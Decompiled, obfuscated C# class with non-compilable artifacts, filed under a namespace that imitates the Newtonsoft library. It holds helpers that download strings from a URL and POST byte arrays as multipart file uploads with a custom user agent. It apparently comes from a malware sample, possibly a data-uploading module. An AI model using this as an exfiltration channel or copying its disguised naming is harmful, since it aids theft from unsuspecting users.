using GDBD.Workers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;

namespace Newtonsoft.Database
{
	internal sealed class ItemEventEntry
	{
		public sealed class UtilsEvent
		{
			[CompilerGenerated]
			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			private byte[] strategyEvent;

			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string _InfoEvent;

			[DebuggerBrowsable(DebuggerBrowsableState.Never)]
			[CompilerGenerated]
			private string _ValueEvent;

			public byte[] File
			{
				[MethodImpl(MethodImplOptions.NoInlining)]
				get;
				[MethodImpl(MethodImplOptions.NoInlining)]
				set;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			public string _0001()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _InfoEvent;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			public void _0001(string task)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_InfoEvent = task;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			public string _0002()
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				return _ValueEvent;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			[CompilerGenerated]
			public void _0002(string asset)
			{
				//Discarded unreachable code: IL_0002
				//IL_0003: Incompatible stack heights: 0 vs 1
				_ValueEvent = asset;
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public UtilsEvent(byte[] key)
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				this._002Ector(key, null);
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public UtilsEvent(byte[] asset, string pol)
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				this._002Ector(asset, pol, null);
			}

			[MethodImpl(MethodImplOptions.NoInlining)]
			public UtilsEvent(byte[] v, string second, string third)
			{
				//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
				//IL_0003: Incompatible stack heights: 0 vs 1
				//IL_0007: Incompatible stack heights: 0 vs 1
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_001a: Incompatible stack heights: 0 vs 1
				SingletonReader.PushGlobal();
				base._002Ector();
				File = v;
				_0001(second);
				_0002(third);
			}
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string ConcatList(string value)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			WebClient webClient = new WebClient();
			return webClient.DownloadString(value);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static string InvokeList(string first)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			return new Uri(first).Host;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public static HttpWebResponse PrintList(string param, string reg, Dictionary<string, object> template)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			string text = $"----------{Guid.NewGuid():N}";
			string third = "multipart/form-data; boundary=" + text;
			byte[] attr = AssetList(template, text);
			return CountList(param, reg, third, attr);
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static HttpWebResponse CountList(string first, string cust, string third, byte[] attr2)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			HttpWebRequest httpWebRequest = WebRequest.Create(first) as HttpWebRequest;
			httpWebRequest.Method = "POST";
			httpWebRequest.ContentType = third;
			httpWebRequest.UserAgent = cust;
			httpWebRequest.CookieContainer = new CookieContainer();
			httpWebRequest.ContentLength = attr2.Length;
			using (Stream stream = httpWebRequest.GetRequestStream())
			{
				stream.Write(attr2, 0, attr2.Length);
				stream.Close();
			}
			return httpWebRequest.GetResponse() as HttpWebResponse;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		private static byte[] AssetList(Dictionary<string, object> task, string pred)
		{
			//Discarded unreachable code: IL_0002
			//IL_0003: Incompatible stack heights: 0 vs 1
			Stream stream = new MemoryStream();
			bool flag = false;
			foreach (KeyValuePair<string, object> item in task)
			{
				if (flag)
				{
					stream.Write(Encoding.UTF8.GetBytes("\r\n"), 0, Encoding.UTF8.GetByteCount("\r\n"));
				}
				flag = true;
				if (item.Value is UtilsEvent)
				{
					UtilsEvent utilsEvent = (UtilsEvent)item.Value;
					string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"{1}\"; filename=\"{2}\";\r\nContent-Type: {3}\r\n\r\n", pred, item.Key, utilsEvent._0001() ?? item.Key, utilsEvent._0002() ?? "application/octet-stream");
					stream.Write(Encoding.UTF8.GetBytes(s), 0, Encoding.UTF8.GetByteCount(s));
					stream.Write(utilsEvent.File, 0, utilsEvent.File.Length);
				}
				else
				{
					string s2 = $"--{pred}\r\nContent-Disposition: form-data; name=\"{item.Key}\"\r\n\r\n{item.Value}";
					stream.Write(Encoding.UTF8.GetBytes(s2), 0, Encoding.UTF8.GetByteCount(s2));
				}
			}
			string s3 = "\r\n--" + pred + "--\r\n";
			stream.Write(Encoding.UTF8.GetBytes(s3), 0, Encoding.UTF8.GetByteCount(s3));
			stream.Position = 0L;
			byte[] array = new byte[stream.Length];
			stream.Read(array, 0, array.Length);
			stream.Close();
			return array;
		}

		[MethodImpl(MethodImplOptions.NoInlining)]
		public ItemEventEntry()
		{
			//Discarded unreachable code: IL_0002, IL_0006, IL_0012, IL_0019
			//IL_0003: Incompatible stack heights: 0 vs 1
			//IL_0007: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Incompatible stack heights: 0 vs 1
			SingletonReader.PushGlobal();
			base._002Ector();
		}
	}
}
